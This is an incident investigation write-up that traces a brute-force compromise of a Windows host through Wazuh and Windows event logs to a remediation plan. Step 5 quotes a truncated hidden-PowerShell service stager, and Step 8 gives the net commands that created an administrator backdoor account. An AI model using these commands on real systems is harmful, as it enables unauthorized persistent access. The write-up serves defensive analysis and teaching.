# 🔴 Incident Investigation — Brute Force to Full Compromise

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-Incident%20Investigation-red?style=flat)
![Attack Type](https://img.shields.io/badge/Attack-Brute%20Force%20%7C%20Persistence%20%7C%20Backdoor%20%7C%20Defense%20Evasion-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1110%20%7C%20T1543%20%7C%20T1136%20%7C%20T1562-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Wazuh%20%7C%20Windows%20Event%20Logs-informational?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Date** | February 11, 2026 |
| **Target** | 192.168.1.120 — SOC-WINDOWS |
| **Attacker IP** | 3.110.33.3 |
| **Account Compromised** | Administrator |
| **Backdoor Account** | evil-user |
| **Malicious Service** | jTahonQmfBLPAzqQ |
| **Malicious Payload** | badupdater.exe |
| **Severity** | 🔴 Critical |
| **Verdict** | ✅ True Positive — Full system compromise confirmed |

---

## 🎯 Scenario

No alert triggered this investigation. No dashboard flagged it as critical at first glance. What we had was a series of Windows Security events that, when correlated together, told the story of a complete system compromise — from the first failed login attempt to a persistent backdoor account with Administrator privileges and a monitoring agent killed to blind the defenders.

This write-up walks through every step of the investigation — every Event ID, every finding, every conclusion — exactly as it happened.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| **Wazuh** | SIEM — log correlation, alert detection, FIM |
| **Windows Security Logs** | Authentication, account, process, service events |
| **Windows Event Logs** | System and application event correlation |

---

## 🗂️ Artifacts

| Artifact | Description |
|---|---|
| Windows Security Event ID 4625 | Failed login attempts — brute force evidence |
| Windows Security Event ID 4624 | Successful logins — access confirmation |
| Windows Security Event ID 4672 | Special privileges assigned — admin access |
| Windows Security Event ID 5140 | Network share access — ADMIN$ and IPC$ |
| Windows Security Event ID 4688 | Process creation — execution chain |
| Windows Security Event ID 4720 | User account created — evil-user |
| Windows Security Event ID 4732 | User added to group — Administrators |
| Windows System Event ID 7045 | New service installed — persistence |
| Wazuh Rule 506 | Wazuh agent stopped — defense evasion |

---

## 📚 Resources

| Resource | Link |
|---|---|
| MITRE T1110 — Brute Force | [attack.mitre.org](https://attack.mitre.org/techniques/T1110/) |
| MITRE T1543.003 — Windows Service | [attack.mitre.org](https://attack.mitre.org/techniques/T1543/003/) |
| MITRE T1136.001 — Create Local Account | [attack.mitre.org](https://attack.mitre.org/techniques/T1136/001/) |
| MITRE T1562.001 — Disable Security Tools | [attack.mitre.org](https://attack.mitre.org/techniques/T1562/001/) |
| MITRE T1078 — Valid Accounts | [attack.mitre.org](https://attack.mitre.org/techniques/T1078/) |
| Windows Security Event ID Reference | [docs.microsoft.com](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-logon) |

---

## 🔍 Investigation Methodology

```
Step 1 → Failed Logins        (Event ID 4625 — brute force evidence)
Step 2 → Successful Logins    (Event ID 4624 — did they get in?)
Step 3 → Privileges Assigned  (Event ID 4672 — what access did they get?)
Step 4 → Share Access         (Event ID 5140 — what did they access?)
Step 5 → Process Execution    (Event ID 4688 — what did they run?)
Step 6 → Service Installation (Event ID 7045 — persistence mechanism)
Step 7 → Account Creation     (Event ID 4720/4732 — backdoor account)
Step 8 → Defense Evasion      (Wazuh Rule 506 — monitoring killed)
```

---

## 🕵️ Investigation

### Step 1 — The Brute Force Begins

The investigation started by filtering **Windows Security Event ID 4625** — Failed Logon — on the target machine `192.168.1.120`.

> <img width="1293" height="255" alt="p3" src="https://github.com/user-attachments/assets/e3b24e60-392d-4587-a8d9-21eebbc12678" />



```
data.win.system.eventID: 4625 AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 4625?**
>
> Event ID 4625 is logged every time a login attempt fails on a Windows
> machine. It captures the target username, the source IP address, the
> logon type, and the reason for failure. A single 4625 is normal —
> people mistype passwords. Hundreds of 4625 events in seconds from the
> same source IP against the same account is a brute force attack.

What came back was immediate and unambiguous:

```
17:55:21  Administrator  192.168.1.120  3.110.33.3  port 41811
17:55:22  Administrator  192.168.1.120  3.110.33.3  port 38128
17:55:22  Administrator  192.168.1.120  3.110.33.3  port 37137
17:55:23  Administrator  192.168.1.120  3.110.33.3  port 43239
17:55:23  Administrator  192.168.1.120  3.110.33.3  port 46231
17:55:23  Administrator  192.168.1.120  3.110.33.3  port 34331
17:55:24  Administrator  192.168.1.120  3.110.33.3  port 38303
```

Multiple login attempts per second. All from the same external IP `3.110.33.3`. All targeting the `Administrator` account. All on different source ports — a clear signature of an **automated brute force tool** cycling through attempts as fast as the network allows.

But the attacker did not stop at RDP. The logs also showed a second attack vector running simultaneously:

> <img width="1254" height="270" alt="p2" src="https://github.com/user-attachments/assets/0c4f9063-ba52-4bd0-8f16-2f4cb9d310bf" />


```
17:57:00  administrator  C:\Windows\System32\OpenSSH\sshd.exe  192.168.1.120
17:57:05  administrator  C:\Windows\System32\OpenSSH\sshd.exe  192.168.1.120
17:57:05  administrator  C:\Windows\System32\OpenSSH\sshd.exe  192.168.1.120
17:57:07  administrator  C:\Windows\System32\OpenSSH\sshd.exe  192.168.1.120
```

The same attacker was brute forcing **SSH at the same time as RDP** — using OpenSSH (`sshd.exe`) as the target service. Two protocols. One attacker. One goal.

> **🔍 Why the SSH source IP shows as "-"**
>
> RDP failures log the source IP directly in `data.win.eventdata.ipAddress`
> because Windows handles RDP authentication natively and captures the
> connection details. SSH failures via OpenSSH log differently — OpenSSH
> manages its own authentication layer and the source IP ends up in a
> different field or is not forwarded to Wazuh in the standard format.
> The attacker's IP is still `3.110.33.3` — confirmed from the RDP events
> and the successful login events that followed.

---

### Step 2 — The Brute Force Succeeds

After the flood of failed attempts, I pivoted to **Event ID 4624** — Successful Logon — to find out if the attacker broke through.

> <img width="1274" height="503" alt="p5" src="https://github.com/user-attachments/assets/c22f5d9a-c67a-442d-8b89-494b77d6d8d0" />

> <img width="1295" height="261" alt="p4" src="https://github.com/user-attachments/assets/71b482fb-cdc7-45c6-9e61-d1c90809684d" />


```
data.win.system.eventID: 4624 AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 4624?**
>
> Event ID 4624 is logged every time a user successfully authenticates
> to a Windows machine. It captures the account name, source IP, logon
> type, and session details. Finding 4624 events from the same IP that
> was generating 4625 failures moments earlier is the confirmation that
> the brute force worked.

The results showed 10 successful logins concentrated in a single window:

```
17:55:24  Administrator  192.168.1.120  3.110.33.3  port 42317  ← RDP SUCCESS
17:56:17  Administrator  192.168.1.120  3.110.33.3  port 35297  ← RDP SUCCESS
17:57:24  Administrator  sshd.exe       192.168.1.120            ← SSH SUCCESS
17:57:35  sshd_3864      sshd.exe       192.168.1.120
17:57:09  sshd_252       sshd.exe       192.168.1.120
17:57:03  sshd_3352      sshd.exe       192.168.1.120
17:56:55  sshd_2276      sshd.exe       192.168.1.120
17:54:07  sshd_1196      sshd.exe       192.168.1.120
18:01:17  sshd_392       sshd.exe       192.168.1.120
```

The attacker was in. Not once — but through **two independent channels
simultaneously**. RDP and SSH both authenticated successfully. The machine
was fully accessible from `3.110.33.3`.

The `sshd_XXXX` entries are temporary service accounts that OpenSSH
creates for each active session — each one represents a separate SSH
connection that authenticated successfully. Multiple sessions means the
attacker was maintaining several simultaneous connections.

---

### Step 3 — Administrator Privileges Confirmed

With successful logins confirmed, the next question was what level of
access the attacker gained. I filtered **Event ID 4672** — Special
Privileges Assigned to New Logon.

> <img width="1061" height="532" alt="p88" src="https://github.com/user-attachments/assets/c9efa78f-3d94-4ae1-8548-97efc23048e4" />

> <img width="1066" height="530" alt="p8" src="https://github.com/user-attachments/assets/d2bdcac3-c71b-4b44-a3c9-5b4e11a15399" />


```
data.win.system.eventID: 4672 AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 4672?**
>
> Event ID 4672 is logged immediately after a successful login when the
> authenticated session is assigned special security privileges. In a
> standard user login, this event either does not fire or fires with a
> minimal privilege set. When an Administrator logs in, it fires with
> a full set of elevated privileges including SeDebugPrivilege,
> SeImpersonatePrivilege, and others that give complete control over
> the system. Seeing 4672 fire right after a 4624 from a suspicious
> source confirms the attacker did not just get in — they got in with
> full administrative power.

```
17:55:24  Administrator  ← 4672 fires immediately after RDP login
17:56:17  Administrator  ← 4672 fires again after second RDP login
17:57:03  sshd_3352
17:57:09  sshd_252
17:57:17  sshd_4088
17:57:35  sshd_3864
17:56:55  sshd_2276
17:54:07  sshd_1196
18:01:17  sshd_392
```

Every session — both RDP and SSH — received elevated privileges
immediately on login. The attacker had full Administrator rights
across every connection they established.

---

### Step 4 — Administrative Shares Accessed

Right after the first successful login, the attacker did not wait.
I filtered **Event ID 5140** — A Network Share Object Was Accessed.

>  <img width="1293" height="388" alt="p10" src="https://github.com/user-attachments/assets/3467318d-792f-45fb-8410-6edb6f1eda97" />


```
data.win.system.eventID: 5140 AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 5140?**
>
> Event ID 5140 is logged when a network share is accessed. Windows has
> several built-in administrative shares that are hidden from normal
> browsing but accessible to administrators:
>
> `ADMIN$` maps directly to `C:\Windows\` — the Windows system directory.
> Accessing it remotely gives read and write access to the entire
> Windows folder.
>
> `IPC$` is the Inter-Process Communication share — used to authenticate
> and establish named pipe connections between systems. Many remote
> administration tools use IPC$ as part of their connection process.
>
> Seeing both shares accessed immediately after a brute-forced login
> from an external IP is not routine administration. It is an attacker
> exploring the system and potentially staging tools.

```
17:55:24  Administrator  \\*\\ADMIN$   ← accessed immediately after first login
17:56:17  Administrator  \\*\\IPC$
17:56:17  Administrator  \\*\\ADMIN$
17:56:17  Administrator  \\*\\IPC$
```

The attacker accessed `ADMIN$` — `C:\Windows\` — within the same second
as the successful login. This is consistent with using a tool like PsExec
or a custom implant that copies itself through the administrative share.
This is very likely **how `badupdater.exe` was delivered to disk** —
copied through `ADMIN$` before being executed — though the file creation
event was not captured due to a logging gap.

---
### Step 5 — A Malicious Service Is Installed

At 17:56:20 — only 56 seconds after the first successful login — I found
**Event ID 7045** — A New Service Was Installed in the System.

> <img width="1039" height="486" alt="p11" src="https://github.com/user-attachments/assets/0c2c9775-bd2c-462d-b496-5d3d516fff6a" />


```
data.win.system.eventID: 7045 AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 7045?**
>
> Event ID 7045 is logged by the Windows Service Control Manager whenever
> a new service is registered on the system. Services are programs that
> run in the background, start automatically with Windows, and operate
> independently of user sessions. Attackers love services as a persistence
> mechanism because they survive reboots, run with SYSTEM privileges, and
> are easy to hide among the hundreds of legitimate services on any
> Windows machine.

```
Time:          17:56:20
Service Name:  jTahonQmfBLPAzqQ
Service File:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden
               -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}
               else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\
               powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;
               $s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c ...'
```

**Three things immediately stood out:**

**1 — The service name is randomly generated**
```
jTahonQmfBLPAzqQ
```
No legitimate Windows service or application uses a random string of
letters as its name. This is a classic malware technique — generate a
random name at runtime so signature-based detection cannot match it.

**2 — The command runs PowerShell completely hidden**
```
%COMSPEC% /b /c start /b /min powershell.exe
-nop        → no PowerShell profile loaded
-w hidden   → window is hidden — user sees nothing
-noni       → non-interactive mode
-c          → execute the following command
```
This is designed to be completely invisible to the user. No window.
No taskbar entry. No indication anything is running.

**3 — It checks the system architecture before executing**
```
if([IntPtr]::Size -eq 4){$b='powershell.exe'}
else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'}
```
The payload checks whether the system is 32-bit or 64-bit and uses
the correct PowerShell binary for each. This level of care means this
is not a script kiddie tool — this is a professionally written implant.

**This service is the persistence mechanism** — it runs `badupdater.exe`
through a hidden PowerShell chain every 5 minutes via `svchost.exe`,
survives reboots, and operates silently in the background.

---
### Step 6 — The Payload Executes

Despite the Wazuh agent being killed, process creation events still
captured what happened next. Filtering **Event ID 4688** — A New Process
Has Been Created — revealed the execution chain:

> <img width="1318" height="535" alt="p6" src="https://github.com/user-attachments/assets/3ec67bc6-7780-4726-a08a-f0926b7bb718" />

>  <img width="1308" height="539" alt="p7" src="https://github.com/user-attachments/assets/bbb30c84-9b40-49c1-bd81-52f85226016f" />



```
data.win.system.eventID: 4688 AND *badupdater* AND agent.ip: "192.168.1.120"
```

> **🔍 What is Event ID 4688?**
>
> Event ID 4688 is logged every time a new process is created on a
> Windows system. It captures the new process name, the parent process
> that spawned it, the command line arguments, and the user context.
> This is the primary Windows event for building process trees — the
> parent-child relationships that reveal exactly how an attack chain
> unfolded.

```
17:57:24  sshd.exe → powershell.exe
17:57:24  powershell.exe → powershell.exe
17:58:03  svchost.exe → badupdater.exe
17:58:03  badupdater.exe → conhost.exe
17:58:31  powershell.exe → net.exe
17:58:37  powershell.exe → net.exe
18:03:03  svchost.exe → badupdater.exe
18:03:03  badupdater.exe → conhost.exe
```

**Reading this chain from top to bottom tells the complete story:**

The SSH session spawned PowerShell — giving the attacker an interactive
shell on the target. The malicious service (`jTahonQmfBLPAzqQ`) running
under `svchost.exe` then executed `badupdater.exe` from
`C:\Users\student\AppData\Roaming\` — a user-writable directory that
avoids the need for admin rights to write files.

`badupdater.exe` immediately spawned `conhost.exe` — the Console Host
process — which is required for any process that runs command-line
operations. This confirms `badupdater.exe` was executing shell commands.

Then PowerShell ran `net.exe` twice — once to create a user, once to
add that user to a group.

Five minutes later — `svchost.exe` ran `badupdater.exe` again. And
again `conhost.exe` followed. The service was working exactly as designed —
executing the payload on a 5-minute schedule.

---
### Step 8 — The Backdoor Account Created

The two `net.exe` executions from PowerShell at 17:58:31 and 17:58:37
corresponded exactly with the account manipulation events I found filtering
**Event ID 4720** — User Account Created — and the group change events:

> <img width="1278" height="256" alt="p99" src="https://github.com/user-attachments/assets/1dea68eb-d848-4f3e-8c8b-5a772450e106" />

> <img width="1066" height="217" alt="p999" src="https://github.com/user-attachments/assets/9a166bf3-4aad-40d5-a1d7-b31e783bec81" />

> <img width="1311" height="341" alt="p9" src="https://github.com/user-attachments/assets/d39b8395-9f63-44fb-b7d7-7270d3c98223" />




```
17:58:31.801  Domain Users Group Changed
17:58:31.817  evil-user — User account enabled or created
17:58:31.833  evil-user — User account enabled or created
17:58:31.848  evil-user — User account changed
17:58:31.864  Users Group Changed
17:58:37.974  Administrators Group Changed
```

> **🔍 What do these events mean together?**
>
> Reading these events in sequence tells a clear story:
>
> First, `evil-user` was created as a new local account. Then it was
> enabled — meaning it was immediately active. Then its properties were
> configured — password set, account settings adjusted. Then it was added
> to the `Users` group — standard membership. Finally, 6 seconds later,
> it was added to the `Administrators` group — giving it full system
> control.
>
> Six events. Six seconds. One complete backdoor account with
> Administrator privileges.

The commands that produced these events — confirmed by the `net.exe`
executions in the process chain:

```
net user evil-user [password] /add
net localgroup administrators evil-user /add
```

**Why the attacker created this account:**

```
Administrator password reset by defenders → attacker locked out
evil-user still exists with full admin    → attacker still in

Wazuh agent restarted by defenders        → monitoring restored
evil-user can disable it again            → attacker still in control

badupdater.exe removed by defenders       → payload gone
Service jTahonQmfBLPAzqQ still running   → payload restored on next run
```

The attacker built **three independent layers of persistence** — the
service, the payload, and the backdoor account — each one capable of
restoring access independently if any single layer is removed.

---

## ⏱️ Complete Attack Timeline

```
Feb 11, 2026

17:54:07  →  SSH brute force begins
              sshd.exe targeted — automated tool

17:55:21  →  RDP brute force begins from 3.110.33.3
              Event ID 4625 — multiple failures per second
              All targeting Administrator account

17:55:24  →  BRUTE FORCE SUCCESS — RDP
              Event ID 4624 — Administrator logged in
              Event ID 4672 — full admin privileges assigned
              Event ID 5140 — ADMIN$ accessed immediately

17:56:17  →  Second RDP session established
              Event ID 5140 — ADMIN$ + IPC$ accessed again
              Attacker browsing system — staging tools

17:56:20  →  Malicious service installed
              Event ID 7045 — jTahonQmfBLPAzqQ registered
              Hidden PowerShell stager configured as Windows service
              Persistence established — survives reboots

17:57:24  →  SSH session established — PowerShell spawned
              Event ID 4688 — sshd.exe → powershell.exe
              Attacker has interactive shell

17:58:03  →  badupdater.exe executed
              Event ID 4688 — svchost.exe → badupdater.exe
              Event ID 4688 — badupdater.exe → conhost.exe
              Payload running — commands executing

17:58:31  →  evil-user account CREATED
              Event ID 4720 — new user account
              Event ID 4688 — powershell.exe → net.exe

17:58:37  →  evil-user added to Administrators
              Group change event — full admin rights granted
              Backdoor account operational

18:03:03  →  badupdater.exe executed AGAIN
              Service running on 5-minute schedule
              Persistence confirmed active
```

---

## 🧩 IOCs — Indicators of Compromise

| Type | Value |
|---|---|
| **Attacker IP** | 3.110.33.3 |
| **Target Host** | 192.168.1.120 — SOC-WINDOWS |
| **Compromised Account** | Administrator |
| **Backdoor Account** | evil-user |
| **Malicious Service Name** | jTahonQmfBLPAzqQ |
| **Malicious Payload** | C:\Users\student\AppData\Roaming\badupdater.exe |
| **Attack Protocols** | RDP + SSH simultaneous brute force |
| **Admin Shares Accessed** | ADMIN$ / IPC$ |
| **Persistence Method** | Windows Service + Backdoor Account |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Brute Force: Password Guessing | T1110.001 | Event ID 4625 — mass failed logins |
| Initial Access | Valid Accounts | T1078 | Event ID 4624 — Administrator login success |
| Execution | PowerShell | T1059.001 | sshd.exe → powershell.exe → net.exe |
| Execution | Windows Command Shell | T1059.003 | cmd.exe via %COMSPEC% in service |
| Persistence | Create Account: Local Account | T1136.001 | evil-user created and added to Admins |
| Persistence | Windows Service | T1543.003 | jTahonQmfBLPAzqQ service installed |
| Privilege Escalation | Valid Accounts | T1078 | Administrator — Event ID 4672 |
| Defense Evasion | Impair Defenses: Disable Tools | T1562.001 | Wazuh agent killed — Rule 506 |
| Defense Evasion | Masquerading | T1036 | badupdater.exe named to blend in |
| Lateral Movement | Remote Services: RDP | T1021.001 | RDP brute force and access |
| Lateral Movement | Remote Services: SSH | T1021.004 | SSH brute force and access |
| Discovery | Network Share Discovery | T1135 | ADMIN$ and IPC$ accessed |

---

## 💡 Key Lessons Learned

**1 — Brute Force on Two Protocols Simultaneously**
The attacker targeted both RDP and SSH at the same time — doubling their
chances of success. Exposing multiple remote access protocols to the
internet dramatically increases the attack surface. Neither should be
directly accessible from external IPs without additional controls.


**2 — Random Service Names Are Never Legitimate**
`jTahonQmfBLPAzqQ` does not belong to any known application. Any new
service with a random string name should be investigated immediately.
Alerting on Event ID 7045 with anomalous service names is a high-value
detection rule that costs very little to implement.

**3 — Three Persistence Layers = Three Things to Remove**
The attacker did not rely on a single persistence mechanism. They
installed a service, ran a payload through it, and created a backdoor
account. Removing only one layer leaves the attacker with two remaining
paths back in. Full remediation requires addressing all three
simultaneously.

**4 — ADMIN$ Access Right After Login Is Abnormal**
Accessing `ADMIN$` within the same second as a successful login from
an external IP is not routine administration. This behavior should
trigger an alert — legitimate administrators do not immediately browse
`C:\Windows\` through a network share the moment they connect.

**5 — Logging Gaps Are Exploitable**
The attacker killed the monitoring agent specifically because they knew
it would create a blind spot. The file creation event for `badupdater.exe`
was never captured — we do not know exactly when or how it arrived on
disk. Complete Sysmon coverage with proper configuration would have
closed this gap.

---

## 🔧 Remediation & Recovery

| Priority | Action |
|---|---|
| 🔴 Critical | Isolate 192.168.1.120 from the network immediately |
| 🔴 Critical | Disable and delete evil-user account |
| 🔴 Critical | Stop and delete service jTahonQmfBLPAzqQ |
| 🔴 Critical | Delete badupdater.exe from AppData\Roaming |
| 🔴 Critical | Reset Administrator password |
| 🔴 Critical | Block 3.110.33.3 at perimeter firewall |
| 🔴 Critical | Restart Wazuh agent and verify it is fully operational |
| 🟠 High | Disable RDP and SSH access from external IPs — VPN only |
| 🟠 High | Hunt for jTahonQmfBLPAzqQ and badupdater.exe across all endpoints |
| 🟠 High | Review all accounts created on Feb 11 across the environment |
| 🟠 High | Check all other hosts for connections from 3.110.33.3 |
| 🟡 Medium | Implement account lockout policy — lock after 5 failed attempts |
| 🟡 Medium | Deploy MFA on all remote access — RDP and SSH |
| 🟡 Medium | Alert on Event ID 7045 with anomalous service names |
| 🟡 Medium | Alert on Wazuh agent stopping during active sessions |
| 🟢 Low | Audit all Windows services for random or unknown names |
| 🟢 Low | Review and harden Sysmon configuration for full coverage |

---

## ✅ Conclusion

```
Verdict:     TRUE POSITIVE ✅
Attacker:    3.110.33.3
Target:      192.168.1.120 — SOC-WINDOWS
Duration:    17:54 → 18:03+ (active for at least 9 minutes)
Access:      RDP + SSH — Administrator account
Impact:      Full system compromise
             Monitoring agent killed
             Malicious service installed — survives reboots
             Backdoor account created — Administrator privileges
             Payload running every 5 minutes
```

The attacker was methodical. They brute forced two protocols
simultaneously, got in, immediately accessed the file system, installed
persistence, killed monitoring, ran their payload, and created a backdoor
account — all within 4 minutes of the first successful login.

Every step was documented. Every event was correlated. Every action was
mapped back to a specific Windows Event ID that proved it happened.

> *The attacker killed the monitoring agent to operate in the dark.*
> *But Windows kept logging.*
> *And the logs told the whole story.*

---

## 📚 References

| Resource | Link |
|---|---|
| MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
| Windows Security Events | [docs.microsoft.com](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/) |
| Wazuh Documentation | [documentation.wazuh.com](https://documentation.wazuh.com) |

---
